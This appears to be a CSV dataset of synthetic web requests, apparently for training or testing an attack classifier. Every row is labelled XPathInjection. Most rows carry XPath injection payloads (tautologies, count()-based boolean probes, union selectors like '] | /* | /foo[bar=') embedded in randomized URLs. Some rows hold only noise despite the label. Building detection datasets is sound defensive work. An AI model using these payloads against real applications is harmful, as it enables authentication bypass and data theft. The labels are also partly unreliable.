id,class,vector
21687,XPathInjection,/BtQyVTwlsALM/T7sit6setjochdfdydio/ikt4htl/cyDrI/childGC92d@3Wtmp90PU/sXla.i/nS0o/xiaroeSooewe3t3th/ocALZs3.asp?cm2wn=21&nsrdbscd=iwgeLCyAetttre&schqraEwsrdhsdt=837
21695,XPathInjection,/qg08dsEsi8ihqzuim/Yerosbemstnqe/aNZs6aJoZ/bENaoeUy/VZXgXc/bhIgSe/1jTFcpNp/iuCAEotflrh/3EFL.69ks/dFHwPeuNpvqgDd.I/cotRnlmrou.gif?utqarytphnlmh=dp%27+++++or++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or+++%27eami%27+%3D++++%27&3F7vi5xwinclude=owE7il7afn&binS81oc=y2
21699,XPathInjection,/rZS82WEj-.GI/tica3lnao/iP6cN@window.openupdatenJ.M/niaa0rtn/s3-idJYXRG5i3GN3/9nlqae.dll?ranElhn3=03700&6thih5DeidFe=225471&ujhohdhysnsewe=leiot%5D9wlshi&cSuEWK-copy0=9901897946&uAatt=155&IRmAuetKodptT=p%28+%7Cliaopt%24crloO%7E
21705,XPathInjection,/XTrCl/5pOc8ArovearrLsGrooe/ZhZO44i8lrzM/iiso/rgdox9nmg0seaepqmsnh/9tdSqsns/Wolaxu/eoAoatds/eets5omekxuhi1.css?Oi97=a%3Flss&dsn3nsjaeyu=tveE%27+++++or+++++%28i+%3C+++count%28sa%2Fchild%3A%3Atext%28%29%29+++and+j+%3C++++count%28n1kwn%2Fchild%3A%3Acomment%28%29%29+++and+++k+++++%3C+++++count%28kf%2Fchild%3A%3A*%29++%29++++or+++%27oEa1nl%27+++%3D+%27+++ntts%27++++or&vukvV8B=at%3Bc+eojeUiAe5
21711,XPathInjection,/_qYc/2aoliatkia3/iiewwgwrlhneetresus/sygvQ@0BGa/tosd6hNlp/trnht8ibaroe4So/axfowhdfa/fZtkl9j/mzy5Ltw.msf?likexMfdsock_streamw1Fc=noe&EDEskrolwsnes=72156905&yGLgUWA72T=l+ue&ulhuqwpensnoaT=wDeZ&oteoileaLiOemi=ebiefi&jeaobal2cci2=%5B&huohldtnbOeJIRo=4MN&zI06glto4fdie=ulinkensmochaFols1ic%7C&se5xsf=5452+++++or++++1%3C++++haS%2Fium0%2FD3%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D43%5D++or+0463%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&o4daorbtbrtdui=x&utbbpau=uB1bOdbow2&0rd=5ilisndC0r
21715,XPathInjection,wqtNs=a7OakiTe2einl1&dwxtsst=7118688575&eval-kcC=d33Gn6gk&aa1ilrhfstie9eo=m&m 1l4ylc+rr3&qHwhereerx-4execti=rflaitrrh&tsdavOS=aenDS'   or     6   <    count(path/child::*)     or 'wnleosje'   = '&eEtdigosnbaN=i4wc6Q&keirouvn9a=ae:e:vLto95&I4_1jMWe=tR6L74IR&nrJqaapaccndcat=om@ik&n7p=:(i
21718,XPathInjection,/a./zsnaTarunrescbbydauo/x3UQN.php?ren7age0fnn=60++or+hatraT%2Fmrt%2Fnltits%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D828%5D+++++or++9871%3D&hwr=57
21747,XPathInjection,/dgqreeednOpj5imm/RJgwXuSZ5hizXU.jpg?oabfc=770++++or+++1%3C+++++Ebe%2FuePitt%2Fieca%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D132%5D++++or+++4952%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&t342cl=podpduh910utdshu7&aU9coaobtestt=Tkurmnan&vRbody.K4=lubkii&eifgrieia=hgnc&o7tdjnnhyyo=brgobnisystem&QfwoP2@@K3=81874&eeoiddeemecs6r=533664&nsIinobMYF7=1
21828,XPathInjection,jsIr9i=iMvWY&nireuiz6hXMuc=91
21854,XPathInjection,/e4friutAddi31jsbvnhs/eqvLvUoM/hSebzZtRvaew/n8uk3atdc8/K5f0u_bgsoundcer/8_T4PGtgMRHM.9.sh?7dOI=s&eire=20162220&TMincludeT=52044&ssurrhrtoAvtLeN=orda%3ASseNh&t7ia1s2zev=rSalteh&arteosairrznewp=23&6gereiytiheei=7&obqtmtE=dtelcp8xrtt1inO&4icepf=selecti&Rb8eo915=tta4tu&ofcoFsitdsiia=iLru&epIHo=tanf&kSRjMunionGIc=lyfrc&t7v4-baEv=ei9ttke%27%5D+++%7C+P++++%7C+%2F%2Fuser%5B+name%2Ftext%28+%29+%3D++%27de&i6jhuNae=53933
21861,XPathInjection,/f-0WKT1Rk4pVZ4m/lH2z69nrC/9t/ioUtaoi3elpigej/teghose.sh?Ottejeto2peE=nS_Kfa&uumeeAnjt5om=eey%27+++or+%28i+%3C+count%28ndtois%2Fchild%3A%3Atext%28%29%29++and+++j++%3C+++count%28rpsrd%2Fchild%3A%3Acomment%28%29%29+and++++k+++++%3C+++count%28Kfsm%2Fchild%3A%3A*%29+%29+++or++++%270ezAsa%27+%3D+%27+++ueqs7h%27+++++or&ogholtoytSoeh=btejartmq&awb8di4=4702&eCns5dhTtiteu6=ooT&myKd=dtYIddie
21901,XPathInjection,/yTWdeleteGqARb@E/wTubgsoundY/u-PUoKnZ9.msf?Sciboc0s=wneotir4aAaaewla&ntieqed8nhn=8a4an%2FEd6%2Fk%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D4%5D+or++%27tr%27+++%3D+++%27&r8a=5&asL6iRrg=sa2oumhla+k&rilneWntotur=psfuky%5C%5BpositionN5yecvs&dxh=91345215&Yq30S0psfroml18=hhpyldoT3eit0iecr&e4o0=nN&EB4qadminwVandFf=2834887&l67shuemtdee5=fen%25stmdoeinsertd
21941,XPathInjection,/tM.fu/itnnrnEeeyzp7ntnnc11/vnhqhxhe/8xeRIWX.gft/WCrhgT_6MvR2Fr/nus4lwherptc/qi8/7ZGkzP8R4VLmzf/@tIpvAAPLiframert@lib/6oawnndhaeoslEd.css?dT=eeoa%3B&osdnrp4ngo=rtwgetiUte%7EePn&agHxwquntoeennq=gadeT%27++++or++6++++%3C++++count%28path%2Fchild%3A%3A*%29++++or++%27sa%27%3D++++%27&fMedivawuacao=mfxXBnqNJ4V&8ad742tennorhfe=%3AEudjtdocument&doyaai7=xohye6s&Curaansa=wi3ratu
21972,XPathInjection,/dablihf/ssvmrgsqtheei8e7cs/eIGt--m/ertvOaImochaKechoEj-.gif?S6=325508004&esutz=c7j&tsomrupao9sa=Ldpe%27++or++++1%3C++ho%2Folo4Or%2Fn%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D8%5D+++++or+++++%27p3iwNN%27++%3D++%27
22002,XPathInjection,/05/hteF/ix1V7/Ek16az4i./SlLidEOformBmocha/ar9qziteedNrt7xliee0/PVUUgW/efhicwhlthrnqe.sh?tS=53++++or+e29a%2Ftv6nt%2Fftoa8%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D1%5D++or++0%3D
22010,XPathInjection,/rdnhisokrmdmHep.php3?ihTmti19arrzeoa=le&tr3o64eemnn=141661846&cikBY.@styleeu=nhopie%2Fht%2Fah%2Fchild%3A%3Anode%28%29%5B++position%28%29%3D213%5D+++%7C+++fhnm%2Fhw%2Fpl%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D52%5D++++or+%27slrae%27++%3D+%27&Egtinhvsi=tenIaxt&ttsroo9oqaimso=nvLQVGE&gnibc=9%28tto8%5C&FK5I4vbscript3o=cr1u%5Cch&u51pymgalt=kos&iwmlrdvcai=oh&Y4tc4en68t6xur=2354934&twhis3ayrtwM=eraieXeyrsnntrH&nl9tenou6ioeite=04859
22102,XPathInjection,aFnetcat5=nRh&ttpewnltnuosrlf=eato5nTrbevta&6sap=od0ou']     |  P  | //user[   name/text(  )  =   'o1&1a3=1c0hovvwjuersw&KyD5fromX9wCTaG=75&bpARIrv8alc=]isrY'sKbaio 3g&dwrea92=earm&saiasiL5ak42dot=eVaien0tobf4hst2zu&a4exnci0neqtux=o2adlet
22180,XPathInjection,egoMehitn=846858&XAP@R=gr1c'    or   path/child::node()[position()=N]    or    'xc3u'=  '
22234,XPathInjection,/tDcPuZTGE/lNnde0f9fh3/eFAN1rl4BhomeYR1/doROpeiaQaonetpon/t8x67C2GUTB0G0l/eahotmoneedoes0/ie.mspx?er8iena33oo=5Gaa&yienleg3t=54758&rXtemEtin=ne7gnbet0l&dk3=893&dtrtQrcert5is=ir%2Fet+thiframehX+%5Bs&Gbnmochas_Lcmd@gK3=0httpdtvSniiz%7Egheeo+r&A_gd4jfq=578197&0.sam17_gJ-=tn3++&7-tS-JVB@dK=cnode&dStHunse5aaStl=gpb1tbanreecAh2ae
22251,XPathInjection,/tlilkesa1imdqsnx/4c0q@c8GEx@MY7.dll?ahtabhzets=tasn%3C%40xtermhttpibR&sneEio=75&xPNfYBD=1.I&rsehih=3&sCisai=0++++or+++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or+++6014%3D&tdckt=oS3x7B3.rCp&ednr=++atepnp%3Abi%29Sa1&idu86=idGk6s%40Sua4&smisehl=574021228&iut=5&t8tx=ey1p1oIahGdlso&r2seo81YoLee7o=7&rq=7&enr8lnsenRhu=cbEa
22253,XPathInjection,/edo/eKxGZWse/eqpotttSitdine5sn/Orsa7Dt/tZul65.html?7erhg=3065+++or+++++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++++%7C++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+++++0344%3D&oni5es=iaadlsoczsE&OEtr3aEMos2ts=21694&G3y@xYxpsusx7=mufigee8&nTcu8ro1x=lh78eroaa&16=ierAUalesAmtweyr&mtafnhn=2&ewn6iflikeDQ=aamEcisdtR&PexecjV69hG7=l6TaCnOwaoHSa&jd7co=784
22261,XPathInjection,/hvVGf/BpoI/sqIixz-AyxLUuwaBc2.jpeg?Das61=laeiavbscriptn&ny=oato%2Fcaee%2Fras%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D59%5D+++++or++++%27uw2nfoD%27+++%3D%27
22280,XPathInjection,/uh5blrr7/rv5YXtAxyTq2o/Ep5nydic4enmdbD9te/owwglavmofi/oh/aS9Nujv-Paccess_logoJ/ssqNm/2wlseoGud.exe?fosneft6ny4=mr%27%5D+++%7C+P+++%7C+%2F%2Fuser%5B++++name%2Ftext%28+++%29+%3D+%275ecps&SAG9xd=mEx6SyP&4RvWYM=nhscript&rozipmht=8&o.wPI=bio7ym&io=16120&obp=hryoWg1Zn-&tr=e++eheee9t6where%5DR&sshgs=4836481&ckr=allas&0js=adotsir6I
22281,XPathInjection,/atnmtgoiqoqswV/yD9ncqp.lXO-/Tqp67echoLnxAoZEDu/S625pp3YqsXO@tmpe/SG2Edh/36QeD_.DE0xmlopt3qi/aBrneeawf5rbmtLrTk1/aY/saeoeirab/abatl1ehgmnhtCmr/kd6RFRPf_5Xqt/ek35o2mso1al.nsf?ftpfgyIv1V=hodt%27+or+++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or+++++%27w0x1g%27++%3D%27&sdKreomo=zZVls&r9pWX=xoi_gjD&tr7eY9roossb=f2dnianrahvuf&th0zniqe=lnservicesA7seu%25&8eciegs=erztvfoif4O&qoeaooredtaiuou=aHOqEu3Jr2&9S-orRtYQ=601&kHpto=syOaidDuOitoeniaS&asbermrtezTt=80&ct=mocpassthruicopynullrb3l+
22299,XPathInjection,ob0frepu=5     or     1<    n/oyhl/tleu/child::text()[position()=654]  or     545='] | /* | /foo[bar='
22325,XPathInjection,/dnIhn29Kkg3q/eRBS9hfzRk/n-Na2Jois/tsbH@ei.dll?BUJJ@ok=isoq&xH=0572&rtaswhAft=17835&6kleirre0k1ha=nltgelp&gy2Io5hr8=%28i++%3C++count%28ih%2Fchild%3A%3Atext%28%29%29++++and+++j+++++%3C++++count%28he%2Fchild%3A%3Acomment%28%29%29++++and+++++k+++%3C+++count%28tnE%2Fchild%3A%3A*%29+%29&jmHwW0lperlqBcg=dwindow.openti&OT5bnrcpGcW=yfr+nridioIR%24nawexecnP&Icziai4c=iusdlnNaeamo+k&bitttryHaun=mnLrhhsThpNea&etHswr2nce=5
22356,XPathInjection,/AD7ctAora6aap8a/hru9crrbni/ye/e0woOhZ/eGCmVOtgnOEMIH1tj0/sb6s_FjLr2r1J8Cid0Fl.jsp?eeira4seo2hyocj=s8r%27+or+%28i+%3C+count%282w0icE%2Fchild%3A%3Atext%28%29%29+and++j++++%3C++count%28rczne%2Fchild%3A%3Acomment%28%29%29++++and++k+++%3C+++count%28osw8%2Fchild%3A%3A*%29+%29++++or++++%27enFa%27+++%3D+++%27+++xahNibt%27+++++or&hmrad=258581&yor=uTiHdn&rsSRthLaho=VhjitfeAbit
22377,XPathInjection,/hltSel9isw/irnsi9to9qsM/Elabdhrt/W.3tCUJ/Iena/iedrwm/aws/tTKtDjK1qJZWfiBvajO/ita04sgbetie/acIzo5o/m5SDmIXVtb.8M-/nJTZWMuVI.gif?ishtyacT5a=18678177&ylq8h=5&getrdo=famaane7erdao&skeartr=e0&ne00ieie=3526&BtnphfuseeiE=sMYMwR&myrx=327118&3QallgZN.S-P=%25%7E&stC8=a%27+stdinuEt&ddtgahi=2745889669&oobtsIteweou1n=c&esieagh6lr=5373805782&rdrligrEosca=1118++++or++u7syFi%2Fue%2Fea4%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D5%5D++++or++2460%3D
22404,XPathInjection,/o3wLc_35kEOF/lGeEnXZcu0Cf/ntr/enfjradrto2DR/o150XLzBShX@2sK3/qWkksyuJphteds/4IY/cwhua22ittesorl/qU9CbMuTYR/rre/gWOJ85B.jsp?
22406,XPathInjection,ElEaur2s=sa2f9nl'   or     path/child::node()[position()=N]   or  'ode' ='
22479,XPathInjection,/rig@xajP2k3zaBZ/rEdyRi.mspx?r3d5mEiNloeTVy=mleo%27++or++1%3C+++++dmn%2Footm%2Fsc%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D65%5D++++or++%276i2n6lH%27%3D+++%27&aRtb7=767&enkrue=dn&agqtatyl=6&55SDV=aweanvoceul&mt=20&nxL5=ttbtncmoascomo5&Hnru=0576732524&hhdtti4v=2&cgmrueft1ua=y
22500,XPathInjection,/Yy.ThJZWkQ-Cc/RoxrdaiaIen/.yzFdrop.MtXbED/ra0_GP6/vate0e/hwAe6r.mspx?sleddmxdec1t=sRawherets&childL4__gdropservices9=9&ikeElqoEolaaah=ttet3RCf22ee1t3&isdn5tl3lsrlsf=t-3dZU&zw_jrupdateWKobject0y=753393&tvDrtsent9=nBfwgetcuiaedsM%5D&atIemb=g+ote&hssgYdt7r=s2IplURptbyis&yg9=R%5C&O@DJI=6&rIorhQXMN=maaebptooo5enw&alopcre=6530790817&Hhttps0V0FV=20523&N7ghSlnlnahci=efrf0u&Mc1NytmpEij=03+++or+++1%3C+++++t%2Fn%2Fae%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D84%5D+or++77%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
22504,XPathInjection,/e3/eO2OaH/rQkP-jxSpX-3/sGz/a7C/ejttUC9dehaiej.nsf?tserti6n=udjeos&sTaaoeoLygae=54558779&replaceAul=921432&nIe1a7idrsmteox=on%27++or+r%2FrRi8mc%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D429%5D+or+%27rDra7etr%27+%3D%27&4nullimtmpTR.=0&@7XdOCsZsJ=hGxD%40PJ-15xq&tMeZwdnb=execroai%28nR&KRXyWLQ=a+tzhtacces&net=eJkDmF2i&tlgs=p7n&vi=0048710385&mzr6Uanssafu=t9
22513,XPathInjection,/enL6QpkHn/lPLhjeqhln6l3tt/rA.eHm.ptUjyVX/djI.aVL/sq0jry0yPAkdjy/hCGU/gwq/bPySoF/jboUJmQi3N0VR/3OXOIwUf4sLdCkMw6uD/re1tHpinnb4qmsdee1/iY@aHmE4phJOhmsLv16N.php4?etrnArm=0&de5ttlt=tgrcE&EuEtpaxmEehtss=30&nfdexdenrfreaTn=h&ofom9cnINas=aby1m&cutosbFqrzhtNs=processing-instructionc6%3Cte&sat05c9a=rSOGuU&St=h%3C%5C%3Bdtouiinputd&eahuaoaahCfmnr=nrmailcyyi&utsirlMwlhpa=nK8x9_HEu&ss=fo8QYb9Nku%40Q&rn=it%407&wsrwe=8751140
22538,XPathInjection,/epfuki/aKo/sbLevHpbq3-COP7oHT1.asmx?heenIcix=92+++++or+1%3C++++ezaufu%2F4%2F94ash%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D375%5D++++or+4341%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&zihbtleeys5=625730&qrthixoodU=tIdIPjSl8Hi&zi3Aa0=tuAnha&shthege0at6tyc=epN&ibodihi9r=%5DatchildDE&ElrleRyygi=m&oe2mersou=96&.div0E=jIhD8Gfa8&osvle3=53421&UB6udY2Npassthru=oj7&n3y=6271705&leEAetGbseau=nl3a
22551,XPathInjection,/wnsiderxr/nbanAtgzslaipaeijfhy/IperlxtermJx/ibbRemglu/Tcmc7s/rv4l/l7GJrcpKsye/lrnpstdinC3d.P.pl?ce=tAgsfche%27+++or++++6+%3C+++++count%28path%2Fchild%3A%3A*%29++or++++%27wtqtoy%27%3D+%27
22571,XPathInjection,/uM_qF17CY81zaZ0G/access_log2731/nk9T4anI/b7pr1H1znwQFQ1cDuY46/sqQfzjhvgW/adKkDcmdEwU./XQEvilHzLl/1d0AebEynllni/HUE93S_.jpg?cyg3ug9fnhaaU=5++or+++++1%3C+++szt%2Fes%2Fq%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D878%5D++or+71%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&eewanah890ok3a=e&nullEwsLY=19Ohldn6crtu5Lrntt&net=EvAtst
22573,XPathInjection,/l-lo/nOooknhrahybopcslow/3vKLHRY7G5wp-Lg/rpGandvarTideleten1FtRmb.php3?ebc=nnE5i7s0wao&cc3fitHceo=31195872&dyeiairbisae=reh0socb7mta&1wvi_FyTR=87+or++++1%3C+++2i%2FeebddH%2Feofld%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D693%5D++or+++31729%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&ubhh=eh9ditd+urGws&9Cv5Qz=sMrFV&Ns9hrts2eJa=erdc3mailab%7Ee&ai7ms=108720413&alb2bd1dldtero=71971257&gia=683&bnor=rXo-tCw-Uq
22621,XPathInjection,/Hets/ZdeleteUq7PWuMcB7C/RdiH.asp?ow4ch3n9Site=ut3lje8%27++or+++6+++%3C+++count%28path%2Fchild%3A%3A*%29+++++or++%27aojiyey%27+++%3D+%27&tdaNolaq=e5YNZsWin&swsaio6af=gh6nxU7JheV%40&8mtbjrcgd9wtt=f6%5C%3FDooa&TnOrgheEen=3877&nre=DueacndnWinrssoi&setnR4iW9Tila=position9%27l%3DcE+itt&nTseEahde4n4snt=k0H&allateeeyieiI=ez+0aru%3Fpasswdhihebh2systempassthruinclude%25
22652,XPathInjection,/tE2G1@p2FB7VLqzti7p6/erAnhS/sApas/eyHOS91C8jIq6/Fbetweenl3bMbU/tFU@uIn-F8pLJ/aphazh5v.jpeg?ocn0=sand%7Co&zeeee7au=t%40zk5v&pH4W=i&g4csrjnei3eep=tTueer0sms&gftnn3asMyiSob=drrn5ee&ajtbtppeiaeTybt=ust16%27%5D++++%7C+++++P+%7C+%2F%2Fuser%5B+name%2Ftext%28+%29%3D++++%27eeofc&iiframe9E2i=u%3Edywpsastrizcnf
22654,XPathInjection,9cl=ye;croeehadkwh0&8obwjetdueqo=X h&wae9Ntetr=teeaft4hencdcor&ito=kn8elo&ubiad=Dee'    or     hfst/aC/child::node()[processing-instruction()=287] or    'ehm7aTjd'    =    '&B@VQFXb28U.@=25&oli=dI2fm_pICZ3V&dneomneeoebi=48&l1tGTNaeaaul=eY9H&nashdinmnt=7806&eaoenr7e0nfd=729&.UzrzBc8_Po=oYHALdZdBY&ci38ocgahphtb=e9tonp&upAerrixfoen7at=Di/
22672,XPathInjection,/d4YE6zEaYMnrK/0nMlaKv/s8/e5r2nsclyndo/htacces5Isock_streamOimg6Sa59/hv/tot.Jl303PsGW2yk/DAIoq0dewt6meUj/n5HRaVGDK/3dclder7iDamanisoM.dll?nsvtgkeedtonkc=ed_ZRWkUuSa&euhtxxsrbni=exp_&detgToAotU=wwp&relrdnrlcqsc=88+++++or+count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or++++5878%3D&dfodcsjatOnv=a5iwcrselectMre%3F&OjCvcsr8cce=tFJ3zhDycc&gGps=yNel&fbianiavre=0lmhe&rei5=8493660170
22688,XPathInjection,tmz7saniaT=038&5weOehifdesoet1=05305&t6ntwiisr5stt=aa&2schhneadrl6O=0&6J6_yIk=48056148&e6trne7R6A=73701&i6r=lta&5q=7access_log$e&aooeatg5=methbmtual9i
22720,XPathInjection,abThtg=pzh&sma0=981710&aqtd=Eie&edmcsu=e8xtermnsmooaa&ewpYeetat1arR2d=(i <    count(ebct8/child::text()) and    j     <     count(eyce2o/child::comment())   and  k  < count(hSufba/child::*)    )&cvhc2no=oce7p1defo&an=shutdownu\ e&cHlhnptxmeeabBo=a\pceco+escriptopencatl&0QN1HD68MW6=0
22759,XPathInjection,/s8fxLYGmzP25rW/nle39/iouortsoer5/jf/mch/ise9ad5eccumeeyt5twr.cgi?tIopsei3b4hcrrt=%7Erteoay+&iihhaemp5di=ctv%3Cryn&dyhnpso=88&rtF=hnairtariltbOdn&XMbSWBSSR-d=dayip&raaais=442775262&Q4tJZconnectfVYVxx=Btr4h&ry19B.ym1=owitmweNste3oi&L888SechowJEzQ=ssnoLytuanahtcc&neche=6151948511&8elmdrilae=nmdm3c%27+++or++++6+%3C+++count%28path%2Fchild%3A%3A*%29++or+%27iw0%27+++%3D+++%27&1PZmNTeSEwU=aenqQI1m
22801,XPathInjection,/nHVvttbr/rwneiy/aMQDLMLWsd-GO4/e7Pl1BVUYSpY4@2/bvUIZkepg9H2r/kea5i.nsf?tacdritoee7wh=x%2Fwro%2Fd%2Fchild%3A%3Anode%28%29%5B+++++position%28%29%3D036%5D+++++%7C+++wr%2FsSl%2Fsre%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D53%5D+++++or+++%27ecIoep%27+%3D++++%27
22803,XPathInjection,xr7XNgxp_7J=onath
22820,XPathInjection,"uom5Sfnihx3vmjn=mLouVWw9a&s5sbcsTr=59&4p4ccuefio=5&8nosc=en3LpanorOqeoito&mltO3s=euaee&gm9=a6osfa/f""9i&aetcOHwst0S=RoIsdnwHt&4ma=7987&enhxtmuKfeL=ttsHLodntR"
22823,XPathInjection,/iE8hdN4feayp/Iid/gCWSTp3BN/RAW48V20Mx-VY/askdopAHnpceg.asmx?varU7saIwp-Cjgroup
22832,XPathInjection,/siseevSc/telnetcPorNSkiQZ/YDEAV5Hwm/gt/mLMG9MB2Px/p-n76n/sna9zdorhc0tadyia7u/2@l/e6zBPtXN/sCg.@5@ZxC.cfm?t4Sn1r=zwsEiS%2Fa%2Fzr1%2Fchild%3A%3Anode%28%29%5B++++position%28%29%3D227%5D++%7C++++ol%2Fsiah%2FL%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D0%5D+or+%27qnaet%27++++%3D+++%27&ehw=tcrrando+NzcjOc8zsiihomen&naneiri=27702&8iaszelnhS=gtNp+eatOtG%3Cht1+stboot.iniE&tEEvep=atd&eox7xonrsh=tgrS1&ahpOzehrtr=ds%40h&esiss=qtyr+eh%3BeernsHm+l0%28&beasddtie=-cbdf5r85Fg&hlteo4eL=Eliuti%40%7Cf&2ohsw9tvpitedl=go9qhgtatfo&luakpsN4rps=olQ4Dz&f5=511
22841,XPathInjection,/oL2asabl2fnhftl/ooahfrt/an0tltrir/Y2hbkMbodymochan/e-.tiff?ttsStps=aurmuiaewq%26V-+&mleTte=saeer5hg&hhure=ean&w6wcnddbmacnrt=eimSmtXTrM
22846,XPathInjection,/uSieqi/9gZNPWE3EXXiSU@SZ_.pl?zS3ml=tr&sluhaer0hnce=n%27iMmsDNeuA&e9owosnnonlr=9898367&f6ttN06o=tfrpL%27+++++or++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or++++%27hwe5si0l%27+%3D++++%27&oOenru7un5iien=915&geodhahnip=eitI&apmhIws=lR8d-%3Cdoetml&ento0sro2Tr=nAs%26eSs3ct+nw&nrdaeqgnn=l%29eieb&hPwWakZWatG=systemdos+tnhqe&mitbee0nhein5=SbyiqLnOAy&jiIkrhOllet5=i-XtbpHCEN&mrratnmawv=%24s0arhomePte%5Crcpl
22859,XPathInjection,/z0P1TexecrUWne/rcp3507x.exe?6rfrmuom=fkJk13SN&sunitef1=Aoezssfgtstj&ItTCbeA=sg&e8xIvap=fe%27++or++1%3C+++rFesos%2Fhoish%2Fw%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D38%5D+++++or+++%27cGas%27+++%3D+++%27&aingeeaiC=oolorm
22866,XPathInjection,/xtchlqtberee/uroeaMeibaAp/fEjt6tt/pWa7k33.cfm?neis5wjyionaz=libciframeaccepta%3C&evweafsdnmi2v=7099998552&ns0e=2++or+4hH%2Frah%2Ftb%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D3%5D+++or+++++79%3D
22905,XPathInjection,5r2o9arpo=crk(tn~l&ewlos=8iO5x8XudvE&5dS8includeyMHXpu=asef2tbotweurev6
22917,XPathInjection,/Oxmllocationzz_@WtD/fhrnoiie/VY6NG-M3PhwXM/eZfMe4GGH7b/4rmilgs/tlggceb6slurrmcss/mMD53yRwk/fJokLI/4EiollrtaJm8saa7drt.swf?hu=961
22926,XPathInjection,/o5EeaLrcm9vsri/8fwmlOXgslwue/n5TpfW6QQg0i/nrea0eyIm/oLRXT18w-H/pnl2eyb39horehe7e/eJtc/vc.png?jelatras=uxmlx%25u%26&FHIbgsoundps5hU=tTdfaevalwhereaerhaoobject%3Fod%27+&iodeo2esttfe=ehel1stvl&U1mocharG=emSso%27+++or+++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28++++%29%3D%28%28i+%2B+j+++%2B+k%2B+++l++%2B+1%29%5D+++++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+++%27eelE%27++%3D%27+HeiageD%27+or&Rrcp0iO=nodeahmochab%3B&Yhas=98&OV=bjoc4p&isExkcibrd=herneo7lmiu
22995,XPathInjection,/DB9Vb.OwT8@NSvar/as/oohsiiEmgac/wAiirdgc5N2oa.css?chigOe3dtrna=SsacqOneeR%24m+oziframetsps&jllnsh5Sep=7260&i0ShDol=299228477&unuoyd=qH6sous&ehie=9mroled
23000,XPathInjection,/xdyteda8ndidaqtEnsay/c-/Arws2dma3eaO1oi.tiff?rPr2eOt7toal2II=qclr%27+++++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or++%27rhaqart%27+++%3D%27
